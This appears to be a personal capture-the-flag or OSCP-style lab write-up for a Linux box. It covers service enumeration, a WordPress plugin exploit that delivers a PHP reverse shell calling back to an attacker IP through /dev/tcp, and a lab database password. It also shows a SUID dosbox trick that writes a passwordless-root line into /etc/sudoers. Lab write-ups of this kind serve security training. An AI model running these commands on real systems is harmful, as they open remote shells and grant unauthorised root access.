# System Information
OS: Linux
IP: 192.168.206.105

---
# Service Enumeration

## 22/tcp SSH

OpenSSH 8.3

## 80/tcp HTTP

![[Pasted image 20260828183725.png]]

http://192.168.183.105/wp-login.php

wpscan identifies https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/

Find https://www.exploit-db.com/exploits/48979

Change IP and port in line 36 to use reverse shell listener IP and port:

`payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.194/80 0>&1"); ?>'`

Run to get a reverse shell as http.

Skip to privilege escalation.

## 3306/tcp MySQL

Host '192.168.45.194' is not allowed to connect to this MariaDB server


## 5000/tcp Service

Werkzeug/1.0.1 Python/3.8.5

## 13000/tcp Service

## 36445/tcp Service


# Initial Access

# Privilege Escalation

Discover database credentials in `/srv/http/wp-config.php`:

![[Pasted image 20260829104851.png]]

`CommanderKeenVorticons1990`

Find that /usr/bin/dosbox has SUID binary set and is owned by root. Unusual.

[GTFObins reports](https://gtfobins.org/gtfobins/dosbox/#file-write) that it can be used to write to files. Let's try updating /etc/sudoers.

```
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```

![[Pasted image 20260829105512.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260829105751.png]]
